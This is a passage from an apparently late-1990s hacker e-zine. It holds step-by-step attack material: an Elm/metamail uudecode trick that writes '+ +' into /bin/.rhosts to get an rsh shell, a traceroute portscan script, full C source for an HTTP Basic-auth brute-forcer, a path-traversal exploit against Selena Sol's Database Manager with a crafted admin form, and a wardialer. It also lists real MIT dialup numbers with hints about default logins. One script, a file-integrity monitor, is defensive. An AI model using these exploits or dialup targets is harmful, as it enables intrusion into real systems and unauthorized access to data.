ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

On a variety of machines running Sendmail, Elm 2.4 will also be used, the hole
regards the sun-message.csh which is called by Elm, this in turn will call
uudecode which will create a file on the filesystem complete with the
file permissions you previously set, then fail gracefully and not inform you
that the file had been created, h0h0h0.

If you use the 64-bit mime encoding, you can even save the file, look at it,
and not see the evil hax0r file that was specified.

So far linux and anything running the metamail decoder sun-message.csh are
vulnerable..

This is basically what you do... It may not work, don't blame us :
------------------------------------------------------------------

1) create your evil file (a .rhosts in this case)...

        % echo "+ +" > /tmp/eatm3

2) next uuencode your "logic bomb"... making the file /tmp/eatme

        % uuencode /tmp/eatm3 /bin/.rhosts > /tmp/eatme.uue

3) attach the /tmp/eatme.uue to the email to the target so the Content Type
   is set to "default/text"

4) send your e-mail to the target, eg. bin@target.here.com

5) then attempt to use rsh..

        % rsh -l bin target.here.com csh -i

If you don't get a shell from using rsh, then the in.rshd may not be running,
or the exploit may have failed (most probable cause)

This original technique was given to figster, then he wrote up a file, then I
made the file easier to understand, it's quite rare for this to actually work,
so don't think it will first time :-)

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. TraceProbe.sh : falken
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

#!/bin/sh
#
# falken@rune.org presents Traceprobe version 1.4
#
# basically uses strobe to portscan all the hosts from
# a traceroute query, saves me alot of time, thats what it's for..
#
# requires stobe in the same directory as well as
# access to awk and most importantly traceroute.
#

/usr/sbin/traceroute $1 > $1.traceroute
/bin/cat $1.traceroute | awk '{print $2}' > $1.traceroute.host
strobe -i $1.traceroute.host -b $2 -e $3 

# cleanup here..

/bin/rm $1.traceroute $1.traceroute.host

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. BruteWeb (SSL) 2.0 : BeastMaster V
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/*
 *
 *      Brute Web (SSL) 2.0, BeastMaster V.
 *      September 1997, for Confidence Remains High magazine.
 *
 *      You will probably need to download the SSL libraries from
 *      ftp://ftp.psy.uq.oz.au/pub/Crypto/SSL/
 *
 *      To compile (one line) :
 *
 *      cc -o brute_ssl -I/usr/local/ssl/include brute_ssl.c \
 *      -L/usr/local/ssl/lib -lssl -lcrypto
 *
 *      brute_ssl to run, gives usage..
 *
 *      Disclaimer : I am not responsible for anything you do with this
 *                   tool, so please use it in a responsible manner.
 *
 */

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>

#include <rsa.h>
#include <crypto.h>
#include <x509.h>
#include <pem.h>
#include <ssl.h>
#include <err.h>

extern int errno, h_errno;

#define SPACELEFT(buf,ptr) (sizeof buf-((ptr)-buf))
#define newstr(s) strcpy(malloc(strlen(s)+1),s)
#define HTTPD_UNAUTHORIZED 401
#define FL __FILE__,__LINE__
#define MAXDICTWORD 64
#define MAXNAMEPASSLEN 128
#define MAXENCODEDSTRING 256
#define MAXSENDSTRING 300
#define HAS_DICTIONARY 0x0001
#define HAS_USERNAME   0x0002
#define HAS_PORTNUMBER 0x0004
#define HAS_HOSTNAME   0x0008
#define HAS_VERBOSE    0x0010
#define HAS_SSL_OPT    0x0020
#define HAS_REALM      0x0040
#define HAS_DONE_IT    0x0080
#if SSLEAY_VERSION_NUMBER >= 0x0800
#define SSLEAY8
#endif

char alphabet[]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
char *prg_nme;
int mask;
 
struct BASE64_PARAMS
{
        unsigned long int accum;
        int shift;
        int save_shift;
};

/* BeastMaster V's error logging function */
void proc_err(char *func,char *file,int line,const char *fmt, ...)
{
        va_list args;
        
        if (prg_nme!=NULL)
                fprintf(stderr,"[%s]", prg_nme);

        va_start(args, fmt);

        fprintf(stderr," %s() ",func);
        fprintf(stderr,"<file:%s line:%d> : ",file,line);
        vfprintf(stderr, fmt, args);
        fputc('\n', stderr); 
        fflush(stderr);

        va_end(args);
}

/* an implementation of signal() based on sigaction() */
void (*r_signal(int sig,void(*func)())) (int)
{
        struct sigaction act, oact;
        act.sa_handler = func;
        sigemptyset(&act.sa_mask);
        act.sa_flags = 0;
#ifdef SA_RESTART
        act.sa_flags |= SA_RESTART;
#endif
        if (sigaction(sig, &act, &oact) < 0)
                return (SIG_ERR);
        return (oact.sa_handler);
}

/* function to read into a buffer over and SSL connection */
int SSL_readln(SSL *ssl_con, char *buf, int buf_size)
{
        int i=0,done=0,w;
        char tmp[1];

        *(buf+0)='\0';
        while (!done)
        {
                if (i==(buf_size-1))
                        break;
                w=SSL_read(ssl_con,tmp,1);
                if (w<0)
                        return -1;
                if (w==0) return 0;
                if (tmp[0]!=0)
                        *(buf+i)=tmp[0];
                if (*(buf+i)=='\n')
                        done=1;
                i++;
        }
        *(buf+i)='\0';
        return(i);
}

/* read from socket into a buffer until sizeof(buffer) or newline */
int socket_readln(int s,char *buf,short len)
{
        int i=0, w;
        char tmp[1];
        short done=0; 
 
        while (!done) {
                if (i==len)
                        break;
                w=read(s ,tmp, 1);
                if (w==0)  return 0;
                if (tmp[0] != 0) {
                        *(buf+i) = tmp[0];
                }
                if (tmp[0]=='\n') {
                        done = 1;
                }
                i++;
        }
        *(buf+i)='\0';
        return (i);
}

/* base64 encode an arbitrary string */
int base64_encode(int quit,struct BASE64_PARAMS *e_p,char *string_to_encode,char *buf_64)
{
        int index;
        unsigned long int value;
        unsigned char blivit;
        int z=0;

        index = 0;
        while((*(string_to_encode+z))||(e_p->shift!=0))
        {
                if ((*(string_to_encode+z))&&(quit==0))
                {
                        blivit = *(string_to_encode +z);
                        z++;
                        if (*(string_to_encode+z)==0)
                        {
                                quit = 1;
                                e_p->save_shift=e_p->shift;
                                blivit=0;
                        }
                }
                else
                {
                        quit=1;
                        e_p->save_shift=e_p->shift;
                        blivit=0;
                }
                if ((quit==0)||(e_p->shift!= 0))
                {
                        value=(unsigned long)blivit;
                        e_p->accum <<= 8;
                        e_p->shift += 8;
                        e_p->accum |= value;
                } 
                while (e_p->shift >= 6)
                {
                        e_p->shift -= 6;
                        value = (e_p->accum >> e_p->shift) & 0x3Fl;
                        blivit = alphabet[value];
                        *(buf_64+(index++)) = blivit;
                        if (index >= 60)
                        {
                                *(buf_64+index)='\0';
                                index = 0;
                        }
                        if ( quit != 0 )
                                e_p->shift = 0;
                }
        }
        if (e_p->save_shift==2)
        {
                *(buf_64+(index++))='=';
                if (index>=60)
                {
                        *(buf_64+index)='\0';
                        index=0;
                }
                *(buf_64+(index++))='=';
                if (index>=60 )
                {
                        *(buf_64+index)='\0';
                        index=0;
                }
        }
        else if (e_p->save_shift==4)
        {
                *(buf_64+(index++))='=';
                if (index>=60)
                {
                        *(buf_64+index)='\0';
                        index=0;
                }
        }
        if (index!=0)
                *(buf_64+index)='\0';

   return quit;
}

/* takes string to encode and a user supplied buffer as parameters */
void encode_string (char *name_pass,char *buf_64)
{
        struct BASE64_PARAMS e_p;
        int quit=0;
        register int i;
        char s[MAXNAMEPASSLEN+3];

        e_p.shift = 0;
        e_p.accum = 0;
  
        sprintf(s,"%s%c",name_pass,*(name_pass+strlen(name_pass)-1));
        base64_encode(quit, &e_p, s,buf_64);

        return;
}

/* check the web server's HTTP response headers */
short check_response (char *response)
{
        short ScanCount;
        int httpd_code;
        short version;

        ScanCount=sscanf(response,"HTTP/1.%d %d",&version,&httpd_code);
        if (ScanCount!=2)
                return 0;

        if (httpd_code==HTTPD_UNAUTHORIZED)
                return 0;
        else
                return 1;
}

/* reads a line from a file */
short read_line(FILE *fp, char *buf)
{
        int c;
        short done=0;
        short i=0;

        while (!done)
        {
                c=fgetc(fp);
                if (c==EOF)
                        return 0;
                if (c=='\n')
                {
                        done=1;
                        break;
                }
                if (c)
                        *(buf+i)=c;
                i++;
        }
        
        *(buf+i)='\0';
        return i;
}

void terminate (int sig)
{
        proc_err("terminate",FL,"[%s] has caught %d (%s)",
        prg_nme,sig,(sig==SIGINT)?"SIGINT":"SIGSEGV");
        exit(EXIT_FAILURE);
}

/* creates a TCP socket and connects it to a peer */
int make_socket(char *in_host,unsigned short port_num)
{
        int sd, err;
        struct hostent *hp=NULL;
        struct sockaddr_in sa;

        sd=socket(AF_INET, SOCK_STREAM, 0);
        if (sd==-1)
        {
                proc_err("make_socket",FL,"Could not create socket->%s",strerror(errno));
                exit(EXIT_FAILURE);
        }

        hp=gethostbyname(in_host);
        if (!hp)
        {
                if (h_errno==HOST_NOT_FOUND)
                        proc_err("make_socket",FL,"Could not resolv [%s]->Host not Found",in_host);
                else
                        proc_err("make_socket",FL,"Cound not resolv [%s]->DNS error",in_host);
                exit(EXIT_FAILURE);
        }

        bzero(&sa,sizeof(sa));
        sa.sin_family=hp->h_addrtype;
        bcopy(hp->h_addr,(char *)&sa.sin_addr,hp->h_length);
        sa.sin_port=htons(port_num);

        err=connect(sd, (struct sockaddr *)&sa,sizeof(sa));
        if (err==-1)
        {
                proc_err("make_socket",FL,"connect() call failed->%s",strerror(errno));
                exit(EXIT_FAILURE);
        }
        return sd;
}
        
/* prints the program usage */
void print_usage()
{
        int x;
        char messages[][255] = 
        {
                "\n\t'%s [options]'\n\n",
                "Options:\n",
                "\t-v   <optional> verbose mode (print responses to stdout)\n",
                "\t-z   <optional> SSL flag (use this for secure servers)\n",
                "\t-d   dictionary file (full path to dictionary file)\n",
                "\t-u   username (a user on the target webserver)\n",
                "\t-h   hostname (host running the webserver)\n",
                "\t-p   portnumber (port that the webserver runs on)\n",
                "\t-r   realm (the full path to the protected realm)\n\n",
                "Example:\n",
                "\tSay everytime I type https://www.somewhere.com/protected\n",
                "\tinto netscape, a box pops up and asks me to enter in a\n",
                "\tUser ID and password. Well, I have no idea what User ID\n",
                "\tor password to enter in, so I'll try to 'guess' my way in.\n",
                "\tI have a dictionary file in /tmp/dict.txt. Next I'll guess\n",
                "\ta username of \"foo\". Now I can type a command like:\n",
                "\n",
                " %s -z -d /tmp/dict.txt -u foo -h www.somewhere.com -p 443 -r /protected\n",
                "\n",
                "\tNow with any luck I'll eventually see a username and password.\n",
                "\ti.e:   ----USERNAME=foo   PASSWORD=foopass----\n\n",
                "\0"    
        };
        
        fprintf(stderr,"\n-- Brute Web (SSL) v2.0 --\n");
        for(x=0; *messages[x]!='\0';x++)
                fprintf(stderr, messages[x], prg_nme);
}

/* brute_ssl */
int main (unsigned int argc,char **argv, char **envp)
{
        int err=0, sd,in_port=0, try=0;
        char c, *export_buf=NULL;
        SSL *ssl_con=NULL;
        SSL_CTX *ssl_ctx=NULL;
        unsigned long ssl_err;
        FILE *dict_fd=NULL;
        char *dict_name=NULL,*in_host=NULL;
        char *user=NULL,*realm=NULL, *dict_word=NULL;
        char *name_pass_buf=NULL, *encoded_buf=NULL;
        char *p_title=NULL;

        if ((prg_nme=strrchr(argv[0],'/')))
                ++prg_nme;
        else
                prg_nme=argv[0];

        mask=0;

        while((c=getopt(argc,argv,"vzd:u:h:p:r:"))!=EOF)
        {
                switch(c)
                {
                        case 'v':
                                mask|=HAS_VERBOSE;
                                break;
                        case 'z':
                                mask|=HAS_SSL_OPT;
                                break;
                        case 'd':
                                dict_name=optarg;
                                mask|=HAS_DICTIONARY;
                                break;
                        case 'u':
                                user=optarg;
                                mask|=HAS_USERNAME;
                                break;
                        case 'h':
                                in_host=optarg;
                                mask|=HAS_HOSTNAME;
                                break;
                        case 'p':
                                in_port=atoi(optarg);
                                if (!in_port)
                                        err++;
                                mask|=HAS_PORTNUMBER;
                                break;
                        case 'r':
                                realm=optarg;
                                mask|=HAS_REALM;
                                break;
                        case '?':
                                err++;
                }
        }

        if ((optind<argc)||err)
        {
                print_usage();
                exit(EXIT_FAILURE);
        }

        if ((!(mask&HAS_HOSTNAME))||(!(mask&HAS_PORTNUMBER))||
            (!(mask&HAS_USERNAME))||(!(mask&HAS_DICTIONARY))||(!(mask&HAS_REALM)))
        {
                print_usage();
                exit(EXIT_FAILURE);
        }

        r_signal(SIGPIPE,SIG_IGN);
        r_signal(SIGINT,terminate);
        r_signal(SIGSEGV,terminate);

        dict_word=(char *)malloc(MAXDICTWORD);
        if (!dict_word)
        {
                proc_err("main",FL,"Call to malloc() failed->%s",strerror(errno));
                exit(EXIT_FAILURE);
        }

        name_pass_buf=(char *)malloc(MAXNAMEPASSLEN);
        if (!name_pass_buf)
        {
                proc_err("main",FL,"Call to malloc() failed->%s",strerror(errno));
                exit(EXIT_FAILURE);
        }

        encoded_buf=(char *)malloc(MAXENCODEDSTRING);
        if (!encoded_buf)
        {
                proc_err("main",FL,"Call to malloc() failed->%s",strerror(errno));
                exit(EXIT_FAILURE);
        }

        export_buf=(char *)malloc(MAXSENDSTRING);
        if (!export_buf)
        {
                proc_err("main",FL,"Call to malloc() failed->%s",strerror(errno));
                exit(EXIT_FAILURE);
        }
        
        dict_fd=fopen(dict_name,"r");
        if (dict_fd==NULL)
        {
                proc_err("main",FL,"Could not open dictionary file->%s",strerror(errno));
                exit(EXIT_FAILURE);
        }


        if (mask & HAS_SSL_OPT)
        {
                SSLeay_add_ssl_algorithms();
                SSL_load_error_strings();
                ssl_ctx = SSL_CTX_new(SSLv2_client_method());
                if (!ssl_ctx)
                {
                        proc_err("main",FL,"Call to SSL_CTX_new return a NULL");
                        exit(EXIT_FAILURE);
                }
        }


        while (read_line(dict_fd,dict_word))
        {
                sd=make_socket(in_host,in_port);

                if (mask & HAS_SSL_OPT)
                {
                        ssl_con=SSL_new(ssl_ctx);
                        if (!ssl_con)
                        {
                                proc_err("main",FL,"SSL_new() returned NULL.");
                                exit(EXIT_FAILURE);
                        }
                        SSL_set_fd (ssl_con, sd);
                        ssl_err=SSL_connect(ssl_con);
                        if (ssl_err<=0)
                        {
                                ssl_err=ERR_get_error();
                                proc_err("main",FL,"SSL_connect() failed->%s\n", ERR_error_string(ssl_err,export_buf));
                                exit(EXIT_FAILURE);
                        }
                }
                
                sprintf(name_pass_buf,"%s:%s",user,dict_word);
                encode_string(name_pass_buf,encoded_buf); 
                sprintf(export_buf,"GET %s HTTP/1.0\nAuthorization: Basic %s\n\n",realm, encoded_buf);

                try++;

                if (mask & HAS_SSL_OPT)
                {
                        SSL_write(ssl_con,export_buf,strlen(export_buf));
                        SSL_readln(ssl_con,export_buf,MAXSENDSTRING-1);
                        if (mask & HAS_VERBOSE)
                                fprintf(stdout,"\n==[Pass # %d]============\n%s",try, export_buf);
                }
                else
                {
                        write(sd,export_buf,strlen(export_buf));
                        socket_readln(sd,export_buf,MAXSENDSTRING-1);
                        if (mask & HAS_VERBOSE)
                                fprintf(stdout,"\n==[Pass # %d]============\n%s",try, export_buf);
                }

                if (check_response(export_buf))
                {
                        mask |=HAS_DONE_IT;
                        break;
                }

                if (mask & HAS_VERBOSE)
                {
                        if (mask & HAS_SSL_OPT)
                        {
                                while(SSL_readln(ssl_con,export_buf,MAXSENDSTRING-1))
                                        fprintf(stdout,"%s",export_buf);
                        }
                        else
                        {
                                while(socket_readln(sd,export_buf,MAXSENDSTRING-1))
                                        fprintf(stdout,"%s",export_buf);
                        }
                }

                close(sd);

                if (mask & HAS_SSL_OPT)
                        SSL_free(ssl_con);
        }

        if (mask & HAS_DONE_IT)
                fprintf(stdout,"\n\n\t----USERNAME=%s   PASSWORD=%s----\n\n",user,dict_word);
        else
                fprintf(stdout,"\n\n\t----Sorry, but I could not get in.----\n");

        free(dict_word);
        free(name_pass_buf);
        free(export_buf);
        if (mask & HAS_SSL_OPT)
                SSL_CTX_free(ssl_ctx);
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4. Check.sh : xFli
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

#!/bin/bash
#
#
# - Simple Crontab monitor for keeping tabs on index.html
#
# - At the moment, if the script finds a change in the filesize of the file
#   it will copy the bad file to /var/log/.evil and replace it with the 
#   backup, log its actions to /var/log/check.log and inform [mail] of the error.
#    If the backup itself has the wrong filesize, it will shutdown the
#   inetd superserver and notify  [mail]  of the mismatch. You should edit
#   this to run commands more suitable to your situation. (line 58)
#
#
# - Usage check.sh [original] [backup] [filesize] [mail]
#
#
# -       [original] is the FULL PATH to the file you want to guard e.g. /home/http/index.html
# - 	  [backup] is the FULL PATH to the backup of the original e.g. /root/backup.html
# - 	  [filesize] is the size in bytes of the original, e.g. 39790
# -	  [mail] is a mail address that the script should send notifications to, e.g. root@localhost
#  
# - If you want to run the check every 5 minutes, add the following line
# - to root's crontab:
#	0,5,10,15,20,25,30,35,40,45,50,55 * * * *       /root/check.sh /home/http/index.html /root/backup.html 37970 root@localhost
#
#   (remembering to change the paths and the filesize)
#
#
#	--=[ Cheap and nasty code from xFli, your number 1 discount store ]=--
#
#	ONCE AGAIN: TAKE THE TIME TO EDIT THIS TO SUIT YOUR NEEDS BETTER
#		    You might want to take out the line that returns the
#		    status of the file even if it is 'OK' , especially
#		    if you are going to run the script a lot like every
#		    30 seconds... :]
#
#

TIME=`/bin/uname -v`

if [ $1x = x ]; then
   echo "Please read the usuage instructions for this script"
else


if ls -la $1 | grep $3 1>/dev/null 2>/dev/null ; then
		echo "$1 OK  "$TIME>>/var/log/check.log
		echo "">>/vat/log/check.log
else
	echo "">>/var/log/check.log
	echo " - WARNING - file size mismatch on $1 at "$TIME>>/var/log/check.log
	echo "WARNING : FILESIZE MISMATCH on $1"$TIME | mail $4 
	mv $1 /var/log/.evil
		if ls -la $2 | grep $3 1>/dev/null 2>/dev/null ; then
			cp $2 $1 
		else
			echo ""/var/log/check.log
			echo " - WARNING - Filesize mismatch on BACKUP FILE $2 at "$TIME>>/var/log/check.log
			echo " - WARNING - Filesize mismatch on $2 at "$TIME | mail $4
			echo "Shutting down inetd superserver "$TIME>>/var/log/check.log 
			killall -9 inetd
			echo "">>/var/log/check.log
		fi
			
fi
fi

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  5. Selena Sol remote flaw : Cain
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

After many hours of sifting through the source code as part of my job at
an ISP, I stumbled onto something. A problem in the midst of the
authentication libraries of Selena Sol's Database Manager.

In auth-lib.pl at line 192 it reads

   open (SESSIONFILE, "$auth_session_dir/$session_file")

Now this is interesting. Nowhere does it check to make shure you don't
have any '/' chars in the $session_file. So we can specify our own session
file outside the intended path :)

The session file format is:

   id|group|fname|lname|email

always have the group be "admin". This way you get access to the entire
database. Let's say this remote system is some wierd warez archive. They
want us to upload files. So we make a file called werd.dat:

   cain|admin|Cain|Bomb|cain@tasam.com

Then we FTP this file up to the remote system. Depending on what OS they
have, it will either be in /var/ftp/incoming or /home/ftp/incoming or
whatever, you figure it out. Now we make our HTML exploit!!! Just create
this file and view it using lynx, netscape, or whatever.

<form method="POST"
action="http://www.site.com/cgi-bin/db_manager.cgi?setup_file=database.cfg">
<input type="hidden" name=auth_user_name value="cain">
<input type="hidden" name=auth_password value="yomomma">
<input type="hidden" name=session_file value="../../var/ftp/incoming/werd">
<input type="submit" value="Click here to hack">
</form>

All the paths you'll hafta figure out on yer own. Notice theres no ".dat"
after the "../../var/ftp/incoming/werd". It does that automaticlly. You
may need to change the amount of ../'s dont' worry bout going over board
though. It will still work.

What exactly happens? Well, db_manager.cgi runs with whatever setup_file
you specified. It sees that the session_file variable is declare so
instead of going to the login screen, it reads the info from the session
file "Session_files/../../var/ftp/incoming/werd.dat" which contains 
administrator status because the group is "admin". Boom. You're in the
database free to modify or delete anything. 

The reason I found this out was because I found one interesting database I
couldn't search through without a valid username and password. So I did
this. I wouldn't modify anything because who cares.

Cain

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ FONES / SCANNING ]=========[ .SECTION C. ]===========[ FONES / SCANNING ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. ShokDial : Shok
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Originally written based on an idea by zer0x, and written for public
release, this article is NOT property of THTJ, because they are fucking
sIn groupies, this was written by Shok, and therefore is intellectual
property of that author, so don't even think about it you fucking THTJ
fools. --so1o

Serial programming for unix.....boy this stuff is fun. Well unix
is famous for it's special files. The modem is just a file you can open(),
read(), and write() to...for that reason this program can be used on all
unixs'. The only thing different that needs to be changed, is the 
#define MODEMPORT "/dev/cua1", because most unix/unix clones have their
own modem port. For example /dev/ttyS? which is COM1 (to the DOS users),
would be /dev/ttym? in IRIX. Now once this program opens the modem (via 
device/special file) for reading/writing, it will write() to it, and send
it standard modem instructions like +++ATH, ATZ etc....this comes before
any dialing to get the modem ready....we also use a function to check for
"OK" so we know that all is well. On receiving this, then enter the number
we want to dial into a character buffer, append a "\r" to it (to it
actually sends the command), we then write(fd (the file desc. for
/dev/cua1), thebufwiththenum, strlen(thebufwiththenum)); Now once you do
this..you can't write "+++ATH" to it, because it will send that as the
login name (assuming you've connected to a host), so what I did, was I
opened the other modem port (there are two, /dev/cua0 and /dev/ttyS0 are
essentially the same thing (both COM1 to explain it easier), one is used
for dialing out (cua?) and one is used for dialling in and out (ttyS?). So
I opened up the other port and used that to send the command to hang up.
But all the other stuff isn't complex, they are all C primitive
instructions like ScanMin++; which would increse ScanMin by 1, repeat a
while loop, and then the next strcat(phonenum, ScanMin); ... would dial
the next number......you get the idea. That's about all there really is to
say about the technical stuff about it.

Oh yeah one thing.....when it connects, it looks for the string
"CONNECT" returned from the modem serial file. You won't get this message
from faxes as you will only get this message when the connection is
complete, so this will only return *** CONNECT *** if it was a modem. It
will both output to the screen and logfile *** CONNECT *** to
1-xxx-xxx-xxxx. You can use local or long distance, although international
numbers haven't been added at this time (not hard to do just didn't care
to add an extra scanf and an extra CountryCode variable ;) 

About ShokDial (it's temp name for now)
---------------------------------------

This supports random scanning (pseudorandom to be honest, heh) and
sequential (the range you specified and up) scanning. You can give it a
range too but that still does under sequential scanning. To use random
scanning use 'shokdial -r', otherwise it will by default use sequential
scanning. For the other options type 'shokdial -h'. You want to keep track
of the version because I'd almsot guarntee this program is going to
continue changing. I need to add some ncurses GUI effects (heh) and a
function to resume scanning for those of you who are too lazy to even look
at the (by default) wardialer.log and get the last number it dialed
(assuming you used sequential scanning) and entering that as the Scan
number to begin on! 

It will output to wardialer.log and on to the screen. If you have
BEEP = WANTBEEP in the Makefile, it will beep when it connects to a host.
That's about all I really have to say about it. I don't actually use war
dialers (really), so I haven't actually tested this (sorry if there are
any problems but there shouldn't be)....if you do however find a problem,
please let me know! I will fix it and send out a patched version.....you
can get all of them from ftp.janova.org or www.janova.org. Enjoy ;)

                                Shok

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. More MIT dialups : zer0x
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

In CRH issue #5 I listed the mit guest terminus dialups, which you could
use to telnet from. Here is a different one...

1. MTL Terminal Server 

----------------------------------------------------------------------------

Here is a 'private' telnet dialup, no 'guest' access allowed, unlike
Terminus. It may go down or have a password added to it if they notice all
this extra access.

		MTL Terminal Server (mtl-ts.lcs.mit.edu)
				258-7626
				258-7623

----------------------------------------------------------------------------

2. I have scanned the mit prefix and here are some of the carries I have
   found. I'm not sure what this can really be useful for but to maybe know
   the dialup number if you ever own one of these machines. Or who knows,
   maybe one of the default logins works for one of these machines,
   [hint hint ;)]

258-7279  nastasia (os:unix) [nastasia.mit.edu]

258-7934  (os:unix) [unknown host]

258-7238  bozo phone login: (os:unix)[bozo.mit.edu]

258-7780  servi login: (os:unix) [unknown host]

258-7967  mit center for space research (os:unix) [hoku.mit.edu]

258-7936  (os:unix) [host: unknown]

258-7838  (os:vms) [host: unknown]

258-7108   Annex Command Line Interpreter for Annex Reuter

258-7958  (MIT Center For Space Research) (os:unix) [grall.mit.edu]

----------------------------------------------------------------------------

NOTE:
-----

Maybe there were a few machines I didn't put down, possibly because they
were important to me and I did not feel like disclosing them. Maybe I will
place them in later issues, who knows. Scanning colleges is always fun
because you find neat stuff. Some machines even have outdial modems attached
to them :) A good way to find stuff like that is to find the prefix that a
uni puts their machines on and scan scan scan. Also a big company may have
plenty of machines sitting there waiting for you to find and own. Some people
may think that scanning is a bit outdated but it comes in useful. I suggest
you use toneloc if you wish to scan since it is the best dos scanner.
For Linux use Shok's scanner (ShokDial), which is in this issue. 

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. Hiding within the system : efpee
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

"w1ll i ever g3t caught....."
			 
"Guess what !@#$ i figured it out.. i can finally ani sp00f with
 32.666.666.666 hz tone," - " unkn0wn person

I get sick and tired of people... in general explaining to me
how fucking kewl it is to go down to a payfone, and make generous
calls with a redbox.  I find that shit so annoying.. I know
the majority of the people reading this are gonna say.. "y0
3y3 JUST R34D 2600 and 3mm4nu3l t0ught m3 b0ut inb4n signalling
4nd h0w to bu1ld a r3db0x.." - unkn0wn person
	
The main reason anyone ever walked to a payfone in the first place 
was really to lesson the chance of being "..traced.."  Let me
tell u dumbfucks.. ani is everywhere so dont think just cause u
c4n g0 to a payfone u are not gonna get caught.. oh.. btw..

ST0P BU1LD1NG R3DB0X3Z
using pbxz, and k0d0ez!#@%$
is less painless, and
doesnt cost u m0ney!@#$

. sektion 1 . 
	    			
Diverting has been around since the days of the Capn' Crunch
and h1s fux0ring wh1stle.  To bad.. if u even want3d to attempt
to d1vert with blueb0xing u end up using 800 direct numberz to
countries such as gr33ce.  Th1s is all g00d.. but again.. A 
